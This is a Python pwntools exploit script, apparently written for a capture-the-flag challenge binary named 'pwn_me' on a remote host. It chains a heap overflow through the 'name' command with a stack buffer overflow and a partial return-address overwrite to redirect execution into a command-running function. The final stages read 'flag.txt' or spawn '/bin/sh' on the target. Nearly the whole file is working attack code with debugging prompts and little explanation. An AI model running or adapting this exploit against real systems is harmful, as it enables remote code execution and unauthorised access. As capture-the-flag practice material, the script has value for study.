from pwn import *

#p = process("./pwn_me")
p = remote("64.227.23.177",1339)

def initial_heap_overflow():
    name = b'B'*0x200
    stack_buffer = b'A'*0x244 + b'X'*8
    print(" b malloc ; so you can see where the space is allocated")
    input()
    print(p.recv())
    p.sendline(b'push ' + stack_buffer)
    print(p.recv())
    p.sendline(b'name ' + name)
    print(p.recv())
    p.interactive()

def first_name_overflow():
    name = b'B'*0x200
    stack_buffer_1 = b'A'*0x244 + b'X'*8
    stack_buffer_2 = b'C'*0x244 + b'Y'*4 
    stack_buffer_2 += b'Z'*8 #RIP if we call print
    print(" b malloc ; so you can see where the space is allocated")
    input()
    print(p.recv())
    print("DEBUG: Send first push?")
    input()
    p.sendline(b'push ' + stack_buffer_1)
    print(p.recv())
    print("DEBUG: Send name?")
    input()
    p.sendline(b'name ' + name)
    print(p.recv())
    print("DEBUG: Send pop?")
    input()
    p.sendline(b'pop 1')
    print(p.recv())
    print("DEBUG: Send second push?")
    input()
    p.sendline(b'push ' + stack_buffer_2)
    print("DEBUG: Receive push output")
    input()
    print(p.recv())
    print("DEBUG: Go interactive?")
    input()
    p.interactive()

def first_stack_smash():
    name = b'B'*0x200
    stack_buffer_1 = b'A'*0x244 + b'X'*8
    stack_buffer_2 = b'C'*0x244 + b'Y'*4 
    stack_buffer_2 += b'\x67\x1a' #RIP if we call print
    print(p.recv())
    p.sendline(b'push ' + stack_buffer_1)
    print(p.recv())
    p.sendline(b'name ' + name)
    print(p.recv())
    p.sendline(b'pop 1')
    print(p.recv())
    p.sendline(b'push ' + stack_buffer_2)
    print(p.recv())
    print('''DEBUG: 
                b *stack_print+41 ; 
            to see if it jumps to the read call in handle_stack_commands
            Then
                set $rdx = *handle_stack_commands+117
            To see if this process would overrun the stack
            ''')
    input()
    p.sendline(b'print ')
    print(p.recv())
    print("DEBUG: Send the payload?")
    input()
    p.sendline(b'F'*3000)
    print(p.recv())
    input()

def cycle_stack_smash():
    name = b'B'*0x200
    stack_buffer_1 = b'A'*0x244 + b'X'*8
    stack_buffer_2 = b'C'*0x244 + b'Y'*4 
    stack_buffer_2 += b'\xdc\x1a' #RIP if we call print
    p.recv()
    p.sendline(b'push ' + stack_buffer_1)
    p.recv()
    p.sendline(b'name ' + name)
    p.recv()
    p.sendline(b'pop 1')
    p.recv()
    p.sendline(b'push ' + stack_buffer_2)
    p.recv()
    print('''DEBUG: 
                b *stack_print+41 ; 
            to see if it jumps to the read call in handle_stack_commands
            Then
                set $rdx = *handle_stack_commands+117
            To see if this process would overrun the stack
            ''')
    input()
    p.sendline(b'print ')
    p.recv()
    print("DEBUG: Send the payload?")
    input()
    '''
    ret: 0x7461617374616172 ('raatsaat')
    $python
    > from pwn import *
    > cyclic_find(b'raat')
    1968
    '''
    p.sendline(cyclic(3000))
    print(p.recv())
    input()

def percision_stack_smash():
    name = b'B'*0x200
    stack_buffer_1 = b'A'*0x244 + b'X'*8
    stack_buffer_2 = b'C'*0x244 + b'Y'*4 
    stack_buffer_2 += b'\xdc\x1a' #RIP if we call print
    p.recv()
    p.sendline(b'push ' + stack_buffer_1)
    p.recv()
    p.sendline(b'name ' + name)
    p.recv()
    p.sendline(b'pop 1')
    p.recv()
    p.sendline(b'push ' + stack_buffer_2)
    p.recv()
    print('''DEBUG: 
                b *stack_print+41 ; 
            to see if it jumps to the read call in handle_stack_commands
            Then
                set $rdx = *handle_stack_commands+117
            To see if this process would overrun the stack
            ''')
    input()
    p.sendline(b'print ')
    p.recv()
    print("DEBUG: Send the payload?")
    input()
    payload = b'A'*1968
    payload += b'B' *8 #RIP
    payload += b'D' * 8
    payload += b'E' * 8
    payload += b'F' * 8 #Last bit of ROP space, only 32 bytes to work with
    p.sendline(payload)
    print(p.recv())
    input()

def investigate_stack_run():
    #name = b'\\bin\\sh' 
    name = b'cat flag.txt' 
    stack_buffer_1 = b'A'*0x244 + b'X'*8
    stack_buffer_2 = b'C'*0x244 + b'Y'*4 
    stack_buffer_2 += b'\xc0\x19' #RIP if we call print
    p.recv()
    p.sendline(b'push ' + stack_buffer_1)
    p.recv()
    p.sendline(b'name ' + name)
    p.recv()
    p.sendline(b'pop 1')
    p.recv()
    p.sendline(b'push ' + stack_buffer_2)
    p.recv()
    print('''DEBUG: 
                b *stack_print+41 ; 
            to see if it jumps to the read call in handle_stack_commands
            Then
                set $rdx = stack_run
            To see what that function does
            ''')
    input()
    #print("Go interactive?")
    #input()
    #print("Type: print; echo $$")
    #p.interactive()
    p.sendline(b'print')
    print(p.recv())
    print(p.recv())
    input()

def local_stack_run():
    name = b'\\bin\\sh' 
    stack_buffer_1 = b'A'*0x244 + b'X'*8
    stack_buffer_2 = b'C'*0x244 + b'Y'*4 
    stack_buffer_2 += b'\xc0\x19' #RIP if we call print
    p.recv()
    p.sendline(b'push ' + stack_buffer_1)
    p.recv()
    p.sendline(b'name ' + name)
    p.recv()
    p.sendline(b'pop 1')
    p.recv()
    p.sendline(b'push ' + stack_buffer_2)
    p.recv()
    p.sendline(b'print ')
    print("Try: echo $$")
    p.interactive()

def local_cat_stack_run():
    #name = b'\\bin\\sh' 
    name = b'cat flag.txt' 
    stack_buffer_1 = b'A'*0x244 + b'X'*8
    stack_buffer_2 = b'C'*0x244 + b'Y'*4 
    stack_buffer_2 += b'\xc0\x19' #RIP if we call print
    p.recv()
    p.sendline(b'push ' + stack_buffer_1)
    p.recv()
    p.sendline(b'name ' + name)
    p.recv()
    p.sendline(b'pop 1')
    p.recv()
    p.sendline(b'push ' + stack_buffer_2)
    p.recv()
    p.sendline(b'print')
    print(p.recv())
    print(p.recv())
    
def remote_cat_stack_run():
    #name = b'\\bin\\sh' 
    name = b'cat flag.txt' 
    stack_buffer_1 = b'A'*0x244 + b'X'*8
    stack_buffer_2 = b'C'*0x244 + b'Y'*4 
    stack_buffer_2 += b'\xc0\x19' #RIP if we call print
    print(p.recv())
    p.sendline(b'push ' + stack_buffer_1)
    print(p.recv())
    p.sendline(b'name ' + name)
    print(p.recv())
    p.sendline(b'pop 1')
    print(p.recv())
    p.sendline(b'push ' + stack_buffer_2)
    p.recv()
    p.sendline(b'print')
    print(p.recv())
    print(p.recv())

if __name__=='__main__':
    #initial_heap_overflow()
    #first_name_overflow()
    #first_stack_smash()
    #cycle_stack_smash()
    #percision_stack_smash()
    #investigate_stack_run()
    #local_stack_run()
    #local_cat_stack_run()
    remote_cat_stack_run()
